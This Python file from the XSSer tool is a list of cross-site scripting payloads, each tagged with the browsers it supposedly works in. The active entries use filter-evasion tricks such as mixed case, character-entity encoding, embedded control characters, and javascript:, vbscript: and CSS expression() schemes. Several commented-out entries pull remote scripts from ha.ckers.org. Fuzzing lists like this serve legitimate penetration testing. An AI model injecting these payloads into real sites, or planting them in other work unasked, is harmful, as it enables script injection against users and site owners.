## XXSer.py @@ fuzzing vectors @@ psy
#
## This file contains different XSS fuzzing vectors to inject in payloads and browser supports.
## If you have some new vectors, please email me to [root@lordepsylon.net] and i will add your list to XSSer framework.
## After, all people who wants to update the tool only will need to do: (python XSser.py --update)
## Thats all.
###
## Happy Cross Hacking! ;)

vectors = [
		#{ 'payload':"""<SCRIPT SRC=http://127.0.0.1></SCRIPT>""", 
		#  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

	        #{ 'payload':"""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>""",
		#  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
		
		#{ 'payload':"""//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>""",
		#  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		{ 'payload':"""'';!--"<XSS>=&{()}" """,
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},	

		{ 'payload':"""<IMG SRC="javascript:alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		{ 'payload':"""<IMG SRC=javascript:alert('XSS')>""",
  		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
		
		{ 'payload':"""<IMG SRC=JaVaScRiPt:alert('XSS')>""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		{ 'payload':"""<IMG SRC=javascript:alert(&quot;XSS&quot;)>""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		{ 'payload':"""<IMG SRC=`javascript:alert("'XSS'")`>""",
		  'browser':"""[IE6.0|NS8.1-IE]"""},
		
		{ 'payload':'<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		#{ 'payload':"""<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>""",
		#  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		#{ 'payload':"""<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>""",
		#  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		#{ 'payload':"""<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>""",
		# 'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		#{ 'payload':"""<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>""",
		# 'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""}, 

		{ 'payload':"""<IMG SRC="jav   ascript:alert('XSS');">""",
		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		{ 'payload':"""<IMG SRC="jav&#x09;ascript:alert('XSS');">""",
  		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""}, 
		
		{ 'payload':"""<IMG SRC="jav&#x0A;ascript:alert('XSS');">""",
  		  'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""}, 

		{ 'payload':"""<IMG SRC="jav&#x0D;ascript:alert('XSS');">""",
		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		 #{ 'payload':#"""<IMG\nSRC\n=\n"\nj\na\nv\na\ns\nc\nr\ni\np\nt\n:\n"""+
		 #     """a\nl\ne\nr\nt\n(\n'\n"""+
		 #     """X\nS\nS\n'\n"""+
		 #     """)\n"\n>""",
		 # 'browser':"""[|IE6.0|NS8.1-IE] [O9.02]"""},

		 { 'payload':"""perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out""",
  		   'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},
		
		 { 'payload':"""<IMG SRC=" &#14;  javascript:alert('XSS');">""",
	           'browser':"""[IE6.0|NS8.1-IE]"""},
		 
		 #{ 'payload':"""<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>""",
		 #  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
		
		 { 'payload':"""<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>""",
		   'browser':"""[NS8.1-G|FF2.0]"""},
		
		 #{ 'payload':"""<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>""",
		 #  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0]"""},

                 { 'payload':"""<<SCRIPT>alert("XSS");//<</SCRIPT>""",
		   'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		 #{ 'payload':"""<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>""",
		 #  'browser':"""[NS8.1-G|FF2.0]"""},

                 #{ 'payload':"""<SCRIPT SRC=//ha.ckers.org/.j>""",
	         #  'browser':"""[NS8.1-G|FF2.0]"""},

                 { 'payload':"""\";alert('XSS');//""",
		   'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		 { 'payload':"""<IMG SRC="javascript:alert('XSS')""",
		   'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		 #{ 'payload':"""<iframe src=http://ha.ckers.org/scriptlet.html <""",
		 #  'browser':"""[NS8.1-G|FF2.0]"""},

                 { 'payload':"""<SCRIPT>alert(/XSS/.source)</SCRIPT>""",
		   'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

                 { 'payload':"""</TITLE><SCRIPT>alert("XSS");</SCRIPT>""",
	           'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		 { 'payload':"""<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">""",
		   'browser':""" [IE6.0|NS8.1-IE] [O9.02]"""},

                 { 'payload':"""<BODY ONLOAD=alert('XSS')>""",
	           'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		 { 'payload':"""<IMG DYNSRC="javascript:alert('XSS')">""",
		   'browser':"""[IE6.0|NS8.1-IE]"""},

		 { 'payload':"""<IMG LOWSRC="javascript:alert('XSS')">""",
		   'browser':"""[IE6.0|NS8.1-IE]"""},

		 { 'payload':"""<BGSOUND SRC="javascript:alert('XSS');">""",
	           'browser':"""[O9.02]"""},

                 { 'payload':"""<BR SIZE="&{alert('XSS')}">""",
		   'browser':"""[NS4]"""},

		 { 'payload':"""<LINK REL="stylesheet" HREF="javascript:alert('XSS');">""",
		   'browser':""" [IE6.0|NS8.1-IE] [O9.02]"""},

		 #{ 'payload':"""<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">""",
		 #  'browser':"""[IE6.0|NS8.1-IE]"""},

		 #{ 'payload':"""<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>""",
		 #  'browser':"""[IE6.0|NS8.1-IE]"""},

		 { 'payload':"""<IMG SRC='vbscript:msgbox("XSS")'>""",
	   	   'browser':"""[IE6.0|NS8.1-IE]"""},
	 
		 { 'payload':"""<IMG SRC="mocha:[XSS]">""",
	   	   'browser':"""[NS4]"""},

	 	 { 'payload':"""<IMG SRC="livescript:[XSS]">""",
	  	   'browser':"""[NS4]"""},

	 	 { 'payload':"""<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">""",
	   	   'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

	 	 { 'payload':"""<TABLE BACKGROUND="javascript:alert('XSS')">""",
	           'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},

		 { 'payload':"""<TABLE><TD BACKGROUND="javascript:alert('XSS')">""",
		   'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},

		 { 'payload':"""<DIV STYLE="background-image: url(javascript:alert('XSS'))">""",
		   'browser':"""[IE6.0|NS8.1-IE]"""},
				  
		 #{ 'payload':"""<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">""",
		 #  'browser':"""[IE6.0|NS8.1-IE]"""},
		
		 { 'payload':"""<DIV STYLE="width: expression(alert('XSS'));">""",
		   'browser':"""[IE7.0|IE6.0|NS8.1-IE]"""},


		 ]


